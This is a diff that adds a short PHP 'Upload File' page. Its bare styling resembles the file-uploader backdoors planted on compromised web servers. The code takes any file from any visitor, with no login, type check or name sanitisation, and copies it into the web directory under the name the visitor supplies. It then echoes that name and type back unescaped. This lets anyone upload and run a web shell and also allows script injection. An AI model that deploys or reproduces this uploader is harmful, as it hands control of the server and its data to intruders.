@@ -1,0 +1,29 @@
+<title>Upload File</title>
+	<style type="text/css">
+	<!--
+	body,td,th {
+	color: #0F0;
+	}
+	body {
+	background-color: #999;
+	}
+	-->
+	</style><p>
+	<form method="POST" action="" enctype="multipart/form-data" >
+	<input type="file" name="file" />
+	<input type="submit" value="Upload" />
+	</form>
+	<p>
+	<strong>
+	<?php
+	if ($_FILES['file'] != '') {
+	copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Upload process failed: ');
+	}else {
+	die('Please select a file');
+	}
+	?>
+	File uploaded successfully:<br />
+	File Description:<br />
+	File Name: <?php echo $_FILES['file']['name']; ?><br />
+	File Size: <?php echo $_FILES['file']['size'];?> Bytes <br />
+	File Types: <?php echo $_FILES['file']['type']; ?></strong></p>
